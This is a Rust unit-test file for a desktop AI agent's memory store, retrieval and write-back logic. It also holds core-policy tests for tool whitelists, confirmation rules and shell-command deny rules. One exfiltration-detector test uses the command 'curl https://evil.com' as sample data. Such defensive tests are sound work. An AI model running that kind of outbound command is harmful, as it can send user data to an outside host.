//! Memory Module Unit Tests

#[cfg(test)]
mod tests {
    use std::path::PathBuf;
    use tempfile::TempDir;

    use crate::memory::{
        core_policy, retrieval, service, store::MemoryStore, types::*, write_back, MemoryService,
    };

    fn temp_store() -> (TempDir, MemoryStore) {
        let temp_dir = TempDir::new().unwrap();
        let store = MemoryStore::new(&temp_dir.path().to_path_buf());
        (temp_dir, store)
    }

    fn temp_service() -> (TempDir, MemoryService) {
        let temp_dir = TempDir::new().unwrap();
        let service = MemoryService::new(&temp_dir.path().to_path_buf());
        (temp_dir, service)
    }

    // ========================================================================
    // Store Tests
    // ========================================================================

    #[test]
    fn test_store_profile_crud() {
        let (_temp, store) = temp_store();

        // Load empty profile (should return default)
        let profile = store.load_profile().unwrap();
        assert!(profile.preferred_apps.is_empty());

        // Update profile
        store
            .update_profile(|p| {
                p.preferred_apps.insert("notepad".to_string(), 5);
                p.risk_preference_low_level_only = true;
            })
            .unwrap();

        // Reload and verify
        store.clear_cache();
        let profile = store.load_profile().unwrap();
        assert_eq!(profile.preferred_apps.get("notepad"), Some(&5));
        assert!(profile.risk_preference_low_level_only);
    }

    #[test]
    fn test_store_episodic_add() {
        let (_temp, store) = temp_store();

        let entry = EpisodicEntry {
            id: "ep-1".to_string(),
            timestamp: 1000,
            goal: "打开记事本".to_string(),
            intent: "desktop_action".to_string(),
            final_status: "completed".to_string(),
            failure_reason_code: None,
            failure_stage: None,
            runtime_context_digest: RuntimeContextDigest::default(),
            key_entities: vec![],
            used_tools: vec!["open_app".to_string()],
            used_retry: false,
            used_probe: false,
            steps_taken: 1,
            tags: vec!["success".to_string()],
        };

        store.add_episodic_entry(entry).unwrap();

        let episodic = store.load_episodic().unwrap();
        assert_eq!(episodic.entries.len(), 1);
        assert_eq!(episodic.entries[0].goal, "打开记事本");
    }

    #[test]
    fn test_store_procedural_upsert() {
        let (_temp, store) = temp_store();

        let entry = ProceduralEntry {
            id: "proc-1".to_string(),
            created_at: 1000,
            updated_at: 1000,
            target_kind: "app".to_string(),
            stable_window_features: None,
            stable_element_features: None,
            preferred_tool_sequence: vec!["open_app".to_string()],
            success_count: 1,
            failure_count: 0,
            confidence: 0.5,
            last_verified_at: 1000,
            target_pattern: "打开记事本".to_string(),
        };

        store.upsert_procedural_entry(entry.clone()).unwrap();

        // Update existing
        let mut updated = entry.clone();
        updated.success_count = 2;
        updated.confidence = 0.6;
        store.upsert_procedural_entry(updated).unwrap();

        let procedural = store.load_procedural().unwrap();
        assert_eq!(procedural.procedures.len(), 1);
        assert_eq!(procedural.procedures[0].success_count, 2);
        assert_eq!(procedural.procedures[0].confidence, 0.6);
    }

    #[test]
    fn test_store_semantic_and_meta_crud() {
        let (_temp, store) = temp_store();

        store
            .upsert_semantic_entry(SemanticEntry {
                id: "sem-1".to_string(),
                memory_key: "reply_preference".to_string(),
                topic: "用户偏好".to_string(),
                knowledge: "用户喜欢简洁回答".to_string(),
                source_type: "user_fact".to_string(),
                confidence: 0.9,
                created_at: now_millis(),
                updated_at: now_millis(),
                tags: vec!["conversation".to_string()],
                explicit: true,
                mention_count: 1,
                ttl: None,
                status: MemoryStatus::Active,
                conflict_group: None,
            })
            .unwrap();
        store
            .upsert_meta_preference(MetaPreference {
                id: "meta-1".to_string(),
                category: "reply".to_string(),
                preference: "reply_style".to_string(),
                value: serde_json::json!("concise"),
                confidence: 0.8,
                created_at: now_millis(),
                updated_at: now_millis(),
                explicit: true,
                ttl: None,
                status: MemoryStatus::Active,
                conflict_group: None,
            })
            .unwrap();

        let semantic = store.load_semantic().unwrap();
        let meta = store.load_meta().unwrap();
        assert_eq!(semantic.entries.len(), 1);
        assert_eq!(meta.preferences.len(), 1);
        assert_eq!(semantic.entries[0].topic, "用户偏好");
    }

    // ========================================================================
    // Core Policy Tests
    // ========================================================================

    #[test]
    fn test_core_policy_tool_whitelist() {
        assert!(core_policy::is_tool_allowed("list_windows"));
        assert!(core_policy::is_tool_allowed("open_app"));
        assert!(core_policy::is_tool_allowed("click_at"));
        assert!(!core_policy::is_tool_allowed("unknown_tool"));
        assert!(!core_policy::is_tool_allowed("execute_arbitrary"));
    }

    #[test]
    fn test_core_policy_confirmation_required() {
        assert!(core_policy::requires_confirmation("delete_path"));
        assert!(core_policy::requires_confirmation("launch_installer_file"));
        assert!(core_policy::requires_confirmation("click_at"));
        assert!(!core_policy::requires_confirmation("list_windows"));
        assert!(!core_policy::requires_confirmation("read_file_text"));
    }

    #[test]
    fn test_core_policy_registry_path() {
        assert!(core_policy::is_registry_path_writable("HKCU\\Software\\MyApp"));
        assert!(core_policy::is_registry_path_writable(
            "HKEY_CURRENT_USER\\Software\\Test"
        ));
        assert!(core_policy::is_registry_path_writable("HKCU\\Environment"));
        assert!(!core_policy::is_registry_path_writable("HKLM\\Software\\MyApp"));
        assert!(!core_policy::is_registry_path_writable(
            "HKEY_LOCAL_MACHINE\\System"
        ));
    }

    #[test]
    fn test_core_policy_shell_commands() {
        assert!(core_policy::is_shell_command_allowed("pwd", &[]));
        assert!(core_policy::is_shell_command_allowed("dir", &[]));
        assert!(core_policy::is_shell_command_allowed(
            "git",
            &["status".to_string()]
        ));
        assert!(core_policy::is_shell_command_allowed(
            "npm",
            &["test".to_string()]
        ));
        assert!(core_policy::is_shell_command_allowed(
            "cargo",
            &["build".to_string()]
        ));

        assert!(!core_policy::is_shell_command_allowed("rm", &[]));
        assert!(!core_policy::is_shell_command_allowed(
            "git",
            &["push".to_string()]
        ));
        assert!(!core_policy::is_shell_command_allowed(
            "npm",
            &["install".to_string()]
        ));
    }

    #[test]
    fn test_core_policy_privacy_exfiltration() {
        let args_curl = serde_json::json!({ "command": "curl https://evil.com" });
        assert!(core_policy::is_privacy_exfiltration_risk(
            "run_shell_command",
            &args_curl
        ));

        let args_safe = serde_json::json!({ "command": "dir" });
        assert!(!core_policy::is_privacy_exfiltration_risk(
            "run_shell_command",
            &args_safe
        ));

        // Non-shell tools should not trigger
        assert!(!core_policy::is_privacy_exfiltration_risk(
            "open_app",
            &serde_json::json!({})
        ));
    }

    #[test]
    fn test_core_policy_check_action() {
        // Allowed tool
        let check = core_policy::check_action("list_windows", &serde_json::json!({}));
        assert!(check.allowed);
        assert!(!check.requires_confirmation);

        // Allowed but requires confirmation
        let check = core_policy::check_action("delete_path", &serde_json::json!({}));
        assert!(check.allowed);
        assert!(check.requires_confirmation);

        // Not allowed tool
        let check = core_policy::check_action("unknown_tool", &serde_json::json!({}));
        assert!(!check.allowed);
    }

    // ========================================================================
    // Retrieval Tests
    // ========================================================================

    #[test]
    fn test_retrieval_episodes_by_goal() {
        let episodic = EpisodicMemory {
            schema_version: MEMORY_SCHEMA_VERSION.to_string(),
            entries: vec![
                EpisodicEntry {
                    id: "ep-1".to_string(),
                    timestamp: now_millis(),
                    goal: "打开记事本".to_string(),
                    intent: "desktop_action".to_string(),
                    final_status: "completed".to_string(),
                    failure_reason_code: None,
                    failure_stage: None,
                    runtime_context_digest: RuntimeContextDigest::default(),
                    key_entities: vec![],
                    used_tools: vec!["open_app".to_string()],
                    used_retry: false,
                    used_probe: false,
                    steps_taken: 1,
                    tags: vec!["success".to_string()],
                },
                EpisodicEntry {
                    id: "ep-2".to_string(),
                    timestamp: now_millis(),
                    goal: "打开浏览器".to_string(),
                    intent: "desktop_action".to_string(),
                    final_status: "completed".to_string(),
                    failure_reason_code: None,
                    failure_stage: None,
                    runtime_context_digest: RuntimeContextDigest::default(),
                    key_entities: vec![],
                    used_tools: vec!["open_app".to_string()],
                    used_retry: false,
                    used_probe: false,
                    steps_taken: 1,
                    tags: vec!["success".to_string()],
                },
            ],
        };

        let query = MemoryQuery {
            goal: Some("打开记事本".to_string()),
            ..Default::default()
        };

        let results = retrieval::retrieve_episodes(&episodic, &query);
        assert!(!results.is_empty());
        // First result should be the one matching "打开记事本"
        assert!(results[0].0.goal.contains("记事本"));
    }

    #[test]
    fn test_retrieval_semantic_by_goal() {
        let semantic = SemanticMemory {
            schema_version: MEMORY_SCHEMA_VERSION.to_string(),
            entries: vec![
                SemanticEntry {
                    id: "sem-1".to_string(),
                    memory_key: "preferred_language".to_string(),
                    topic: "用户回复偏好".to_string(),
                    knowledge: "用户希望默认使用中文并简洁回复".to_string(),
                    source_type: "user_fact".to_string(),
                    confidence: 0.95,
                    created_at: now_millis(),
                    updated_at: now_millis(),
                    tags: vec!["conversation".to_string(), "preference".to_string()],
                    explicit: true,
                    mention_count: 1,
                    ttl: None,
                    status: MemoryStatus::Active,
                    conflict_group: None,
                },
                SemanticEntry {
                    id: "sem-2".to_string(),
                    memory_key: "whisper_model_path".to_string(),
                    topic: "项目结构".to_string(),
                    knowledge: "Whisper 模型位于 appdata 目录".to_string(),
                    source_type: "project_structure".to_string(),
                    confidence: 0.8,
                    created_at: now_millis(),
                    updated_at: now_millis(),
                    tags: vec!["project".to_string()],
                    explicit: true,
                    mention_count: 1,
                    ttl: None,
                    status: MemoryStatus::Active,
                    conflict_group: None,
                },
            ],
        };

        let query = MemoryQuery {
            goal: Some("默认中文回复".to_string()),
            ..Default::default()
        };

        let results = retrieval::retrieve_semantic(&semantic, &query);
        assert!(!results.is_empty());
        assert_eq!(results[0].0.topic, "用户回复偏好");
    }

    // ========================================================================
    // Service Tests
    // ========================================================================

    #[test]
    fn test_service_retrieve_empty() {
        let (_temp, service) = temp_service();

        let query = MemoryQuery {
            goal: Some("test goal".to_string()),
            ..Default::default()
        };

        let summary = service.retrieve(&query).unwrap();
        assert!(summary.relevant_episodes.is_empty());
        assert!(summary.relevant_procedures.is_empty());
        assert!(summary.semantic_context.is_empty());
        assert!(summary.meta_preferences.is_empty());
    }

    #[test]
    fn test_service_maintenance() {
        let (_temp, service) = temp_service();

        // Run maintenance on empty store
        let result = service.run_maintenance();
        assert_eq!(result.total_changes(), 0);
    }

    // ========================================================================
    // Write-back Tests
    // ========================================================================

    #[test]
    fn test_write_back_success() {
        let (_temp, store) = temp_store();

        let request = WriteBackRequest {
            task_id: "task-1".to_string(),
            goal: "打开记事本".to_string(),
            intent: "desktop_action".to_string(),
            final_status: "completed".to_string(),
            failure_reason_code: None,
            failure_stage: None,
            runtime_context_digest: RuntimeContextDigest::default(),
            key_entities: vec![],
            used_tools: vec!["open_app".to_string()],
            used_retry: false,
            used_probe: false,
            steps_taken: 1,
        };

        write_back::write_back_task_result(&store, request).unwrap();

        // Verify episodic entry created
        let episodic = store.load_episodic().unwrap();
        assert_eq!(episodic.entries.len(), 1);
        assert_eq!(episodic.entries[0].final_status, "completed");

        // Verify procedural entry created
        let procedural = store.load_procedural().unwrap();
        assert_eq!(procedural.procedures.len(), 1);
        assert_eq!(procedural.procedures[0].success_count, 1);
    }

    #[test]
    fn test_write_back_failure() {
        let (_temp, store) = temp_store();

        // First create a successful entry
        let success_request = WriteBackRequest {
            task_id: "task-1".to_string(),
            goal: "打开记事本".to_string(),
            intent: "desktop_action".to_string(),
            final_status: "completed".to_string(),
            failure_reason_code: None,
            failure_stage: None,
            runtime_context_digest: RuntimeContextDigest::default(),
            key_entities: vec![],
            used_tools: vec!["open_app".to_string()],
            used_retry: false,
            used_probe: false,
            steps_taken: 1,
        };
        write_back::write_back_task_result(&store, success_request).unwrap();

        // Then a failure
        let fail_request = WriteBackRequest {
            task_id: "task-2".to_string(),
            goal: "打开记事本".to_string(),
            intent: "desktop_action".to_string(),
            final_status: "failed".to_string(),
            failure_reason_code: Some("tool_failed".to_string()),
            failure_stage: Some("execute_tool".to_string()),
            runtime_context_digest: RuntimeContextDigest::default(),
            key_entities: vec![],
            used_tools: vec!["open_app".to_string()],
            used_retry: false,
            used_probe: false,
            steps_taken: 1,
        };
        write_back::write_back_task_result(&store, fail_request).unwrap();

        // Verify episodic has 2 entries
        let episodic = store.load_episodic().unwrap();
        assert_eq!(episodic.entries.len(), 2);

        // Verify procedural confidence decreased
        let procedural = store.load_procedural().unwrap();
        assert_eq!(procedural.procedures.len(), 1);
        assert!(procedural.procedures[0].confidence < 0.5); // Initial 0.5 - 0.1 = 0.4
        assert_eq!(procedural.procedures[0].failure_count, 1);
    }

    #[test]
    fn test_write_back_conversation_explicit_remember() {
        let (_temp, store) = temp_store();

        write_back::write_back_conversation_turn(
            &store,
            "请记住我喜欢简洁一点的回复。",
            "好的，我会记住。",
        )
        .unwrap();

        let semantic = store.load_semantic().unwrap();
        let meta = store.load_meta().unwrap();
        assert_eq!(semantic.entries.len(), 1);
        assert!(semantic.entries[0].knowledge.contains("喜欢简洁一点的回复"));
        assert_eq!(meta.preferences.len(), 1);
        assert_eq!(meta.preferences[0].category, "retention");
    }

    #[test]
    fn test_write_back_conversation_updates_profile_preferences() {
        let (_temp, store) = temp_store();

        write_back::write_back_conversation_turn(
            &store,
            "以后默认用中文回复我，并且尽量简短一点。",
            "好的。",
        )
        .unwrap();

        let profile = store.load_profile().unwrap();
        let meta = store.load_meta().unwrap();
        assert_eq!(profile.language_style.preferred_language, "zh-CN");
        assert_eq!(profile.language_style.reply_style, "concise");
        assert_eq!(meta.preferences.len(), 2);
    }

    #[test]
    fn test_write_back_conversation_forget_semantic_memory() {
        let (_temp, store) = temp_store();

        write_back::write_back_conversation_turn(
            &store,
            "记住：我的项目目录在 D:/work/demo",
            "好。",
        )
        .unwrap();
        write_back::write_back_conversation_turn(
            &store,
            "忘记我的项目目录在 D:/work/demo",
            "好。",
        )
        .unwrap();

        let semantic = store.load_semantic().unwrap();
        assert!(semantic.entries.is_empty());
    }

    #[test]
    fn test_write_back_conversation_candidate_requires_repeat_for_retrieval() {
        let (_temp, store) = temp_store();

        write_back::write_back_conversation_turn(
            &store,
            "我喜欢用 VS Code。",
            "收到。",
        )
        .unwrap();

        let semantic = store.load_semantic().unwrap();
        assert_eq!(semantic.entries.len(), 1);
        assert!(!semantic.entries[0].explicit);
        assert_eq!(semantic.entries[0].mention_count, 1);

        let query = MemoryQuery {
            goal: Some("你记得我喜欢用什么编辑器吗".to_string()),
            ..Default::default()
        };
        let retrieved = retrieval::retrieve_semantic(&semantic, &query);
        assert!(retrieved.is_empty());

        write_back::write_back_conversation_turn(
            &store,
            "我喜欢用 VS Code。",
            "收到。",
        )
        .unwrap();

        let semantic = store.load_semantic().unwrap();
        assert_eq!(semantic.entries.len(), 1);
        assert_eq!(semantic.entries[0].mention_count, 2);

        let retrieved = retrieval::retrieve_semantic(&semantic, &query);
        assert_eq!(retrieved.len(), 1);
    }

    #[test]
    fn test_store_semantic_candidate_conflict_creates_group() {
        let (_temp, store) = temp_store();

        let now = now_millis();
        store
            .upsert_semantic_entry(SemanticEntry {
                id: "sem-a".to_string(),
                memory_key: "user_project_path".to_string(),
                topic: "用户目录".to_string(),
                knowledge: "用户的目录信息为 D:/work/demo-a".to_string(),
                source_type: "user_fact_candidate".to_string(),
                confidence: 0.5,
                created_at: now,
                updated_at: now,
                tags: vec!["candidate".to_string()],
                explicit: false,
                mention_count: 1,
                ttl: Some(now + 1000),
                status: MemoryStatus::Active,
                conflict_group: None,
            })
            .unwrap();
        store
            .upsert_semantic_entry(SemanticEntry {
                id: "sem-b".to_string(),
                memory_key: "user_project_path".to_string(),
                topic: "用户目录".to_string(),
                knowledge: "用户的目录信息为 D:/work/demo-b".to_string(),
                source_type: "user_fact_candidate".to_string(),
                confidence: 0.55,
                created_at: now + 1,
                updated_at: now + 1,
                tags: vec!["candidate".to_string()],
                explicit: false,
                mention_count: 1,
                ttl: Some(now + 1000),
                status: MemoryStatus::Active,
                conflict_group: None,
            })
            .unwrap();

        let semantic = store.load_semantic().unwrap();
        assert_eq!(semantic.entries.len(), 2);
        assert!(semantic
            .entries
            .iter()
            .all(|entry| entry.status == MemoryStatus::Conflicted));
        let conflict_group = semantic.entries[0].conflict_group.clone();
        assert!(conflict_group.is_some());
        assert!(semantic
            .entries
            .iter()
            .all(|entry| entry.conflict_group == conflict_group));
    }

    #[test]
    fn test_store_promote_candidate_memory() {
        let (_temp, store) = temp_store();

        write_back::write_back_conversation_turn(&store, "我喜欢用 VS Code。", "收到。").unwrap();
        let semantic = store.load_semantic().unwrap();
        let candidate = semantic.entries[0].clone();
        assert!(!candidate.explicit);

        assert!(store.promote_semantic_entry(&candidate.id).unwrap());

        let semantic = store.load_semantic().unwrap();
        let promoted = semantic.entries.iter().find(|entry| entry.id == candidate.id).unwrap();
        assert!(promoted.explicit);
        assert!(promoted.mention_count >= 2);
        assert!(promoted.ttl.is_none());
        assert_eq!(promoted.status, MemoryStatus::Active);
    }

    #[test]
    fn test_store_meta_explicit_update_deprecates_previous_value() {
        let (_temp, store) = temp_store();
        let now = now_millis();

        store
            .upsert_meta_preference(MetaPreference {
                id: "meta-old".to_string(),
                category: "reply".to_string(),
                preference: "preferred_language".to_string(),
                value: serde_json::json!("zh-CN"),
                confidence: 0.9,
                created_at: now,
                updated_at: now,
                explicit: true,
                ttl: None,
                status: MemoryStatus::Active,
                conflict_group: None,
            })
            .unwrap();
        store
            .upsert_meta_preference(MetaPreference {
                id: "meta-new".to_string(),
                category: "reply".to_string(),
                preference: "preferred_language".to_string(),
                value: serde_json::json!("en-US"),
                confidence: 0.95,
                created_at: now + 1,
                updated_at: now + 1,
                explicit: true,
                ttl: None,
                status: MemoryStatus::Active,
                conflict_group: None,
            })
            .unwrap();

        let meta = store.load_meta().unwrap();
        assert_eq!(meta.preferences.len(), 2);
        assert_eq!(
            meta.preferences
                .iter()
                .find(|entry| entry.id == "meta-old")
                .unwrap()
                .status,
            MemoryStatus::Deprecated
        );
        assert_eq!(
            meta.preferences
                .iter()
                .find(|entry| entry.id == "meta-new")
                .unwrap()
                .status,
            MemoryStatus::Active
        );
    }

    #[test]
    fn test_store_resolve_semantic_conflict_keeps_one_active() {
        let (_temp, store) = temp_store();
        let now = now_millis();

        store
            .upsert_semantic_entry(SemanticEntry {
                id: "sem-a".to_string(),
                memory_key: "user_project_path".to_string(),
                topic: "用户目录".to_string(),
                knowledge: "用户的目录信息为 D:/work/demo-a".to_string(),
                source_type: "user_fact_candidate".to_string(),
                confidence: 0.5,
                created_at: now,
                updated_at: now,
                tags: vec!["candidate".to_string()],
                explicit: false,
                mention_count: 1,
                ttl: Some(now + 1000),
                status: MemoryStatus::Active,
                conflict_group: None,
            })
            .unwrap();
        store
            .upsert_semantic_entry(SemanticEntry {
                id: "sem-b".to_string(),
                memory_key: "user_project_path".to_string(),
                topic: "用户目录".to_string(),
                knowledge: "用户的目录信息为 D:/work/demo-b".to_string(),
                source_type: "user_fact_candidate".to_string(),
                confidence: 0.55,
                created_at: now + 1,
                updated_at: now + 1,
                tags: vec!["candidate".to_string()],
                explicit: false,
                mention_count: 1,
                ttl: Some(now + 1000),
                status: MemoryStatus::Active,
                conflict_group: None,
            })
            .unwrap();

        let semantic = store.load_semantic().unwrap();
        let group = semantic.entries[0].conflict_group.clone().unwrap();
        assert!(store.resolve_semantic_conflict(&group, "sem-b").unwrap());

        let semantic = store.load_semantic().unwrap();
        assert_eq!(
            semantic.entries.iter().find(|entry| entry.id == "sem-b").unwrap().status,
            MemoryStatus::Active
        );
        assert_eq!(
            semantic.entries.iter().find(|entry| entry.id == "sem-a").unwrap().status,
            MemoryStatus::Deprecated
        );
    }

    // ========================================================================
    // Helper Functions
    // ========================================================================

    fn now_millis() -> u64 {
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_millis() as u64)
            .unwrap_or(0)
    }
}
